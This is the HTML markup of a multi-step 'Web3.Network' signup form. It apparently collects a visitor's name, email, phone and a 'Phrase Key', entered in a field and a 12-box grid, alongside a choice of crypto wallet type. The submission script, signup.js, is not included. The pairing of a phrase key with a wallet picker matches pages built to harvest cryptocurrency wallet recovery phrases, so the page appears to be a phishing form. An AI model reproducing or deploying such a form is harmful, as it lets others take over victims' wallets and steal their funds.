<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign Up | Web3.Network</title>
  <link rel="stylesheet" href="style.css">
</head>
<body class="auth-bg">

<div class="signup-container">

  <h2>Web3.Network</h2>
  <p>Create your account</p>

  <!-- STEP 1 -->
  <div class="step active">
    <input type="text" id="name" placeholder="Full Name">
    <div class="nav-btns">
      <button type="button" class="next-btn">Next</button>
    </div>
  </div>

  <!-- STEP 2 -->
  <div class="step">
    <input type="email" id="email" placeholder="Email Address">
    <div class="nav-btns">
      <button type="button" class="prev-btn">Back</button>
      <button type="button" class="next-btn">Next</button>
    </div>
  </div>

  <!-- STEP 3 -->
  <div class="step">
    <input type="tel" id="phone" placeholder="Phone Number">
    <div class="nav-btns">
      <button type="button" class="prev-btn">Back</button>
      <button type="button" class="next-btn">Next</button>
    </div>
  </div>

  <!-- STEP 4: SECURITY CODE -->
  <div class="step">
    <input type="text" id="phrase key" placeholder="Phrase Key">
    <p>Phrase Key</p>
    <div class="security-grid">
      <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
      <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
      <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
    </div>
    <div class="nav-btns">
      <button type="button" class="prev-btn">Back</button>
      <button type="button" class="next-btn">Next</button>
    </div>
  </div>

  <!-- STEP 5: WALLET TYPE -->
  <div class="step">
    <select id="wallet">
      <option>Select Wallet Type</option>
      <option>Ethereum</option>
      <option>Solana</option>
      <option>Bitcoin</option>
      <option>Trust Wallet</option>
      <option>Polygon</option>
    </select>
    <div class="nav-btns">
      <button type="button" class="prev-btn">Back</button>
      <button type="button" id="createAccountBtn">Create Account</button>
    </div>
  </div>
  
  <!-- LOADING -->
  <div class="step" id="loading">
    <p>Creating your accountâ€¦</p>
  </div>

</div>

<script src="signup.js"></script>
</body>
</html>
